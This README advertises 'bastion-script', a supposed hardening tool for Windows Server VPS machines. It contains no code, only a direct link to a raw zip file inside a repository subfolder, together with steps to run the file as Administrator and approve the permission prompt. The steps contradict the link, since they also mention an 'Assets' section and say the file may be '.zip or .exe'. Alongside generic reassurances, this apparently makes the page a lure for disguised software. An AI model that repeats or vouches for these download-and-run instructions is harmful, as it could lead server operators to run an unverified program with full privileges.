# 🛡️ bastion-script - Hardening tools for Windows Server VPS

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip)

## 📌 What is this script?

This tool protects your Windows Server VPS from unauthorized access. Attackers often scan the internet for servers with weak passwords or open ports. They attempt to guess your login credentials through a process called brute-forcing. This script automates the hardening process to block these attempts and secure your system. It relies on battle-tested configurations derived from actual recovery scenarios after security breaches.

## 📋 System Requirements

Ensure your server meets these requirements before you run the script:

* Windows Server 2016, 2019, 2022, or 2025.
* Administrative access to the server.
* A stable internet connection.
* Basic knowledge of remote desktop connections.

## 📥 How to download the software

Follow these steps to obtain the correct version for your server:

1. Visit this page to download the latest version: [https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip](https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip)
2. Look for the section labeled "Assets".
3. Click the file ending in `.zip` or `.exe` to save it to your local machine or server.
4. If you download a zip file, right-click the folder and select "Extract All".

## ⚙️ Running the installation

Follow these instructions to apply the security settings to your VPS:

1. Copy the downloaded file to your Windows Server.
2. Log in to your server as an Administrator.
3. Right-click the file and select "Run as Administrator".
4. A window will appear asking for permissions to make changes to your device. Click "Yes".
5. Follow the text-based prompts on the screen.
6. The script will perform a security audit and apply hardened settings automatically.
7. Restart your server when the script finishes its work.

## 🛡️ Key security features

This script performs several automated tasks to lock down your VPS:

* RDP Lockout: It configures the server to block IP addresses that fail to log in multiple times.
* Port Filtering: It restricts access to sensitive ports that attackers target.
* Password Policies: It enforces complex password requirements to prevent easy discovery.
* Audit Logs: It tracks failed login attempts and saves them to a report file.
* Registry Tuning: It applies system-level security tweaks to reduce the attack surface.

## 🔍 Understanding the security audit

When you run the script, it creates a log file. You can find this file in the same folder where you placed the script. The log file explains every change made to your server. Read this file if you need to know which settings changed. 

The audit tool inside the script scans your current setup for risks. It looks for outdated firewall rules, insecure user accounts, and guest account activity. It creates a status report before it applies any changes. 

## ❓ Frequently asked questions

**Will this script lock me out of my own server?**
No. The script specifically allows your current connection to remain active. It focuses on blocking external, malicious attempts.

**Should I run this on every server?**
Yes. Any Windows server exposed to the public internet benefits from these hardening steps.

**Does this require a subscription?**
No. This is a free and open-source tool. 

**What happens if I forget my password?**
This script does not change your existing passwords. It only enforces rules for future password changes.

## ⚠️ Important considerations

Hardening a server involves changing sensitive system settings. Always back up your important data before you run any security automation script. This script follows standard Windows security practices. While it provides significant protection, you remain responsible for maintaining your server's health. 

If you encounter issues during the setup, check the log file first. The script writes errors to this file so you can identify which step failed. If the script reports an error regarding permissions, ensure you opened the file as an Administrator. 

This tool serves as a baseline for your security posture. Use it as part of a larger plan to keep your server safe. Update your Windows OS regularly to ensure the latest patches from Microsoft keep your system protected against new threats. Keep your RDP ports behind a VPN or use a gateway whenever possible for maximum protection.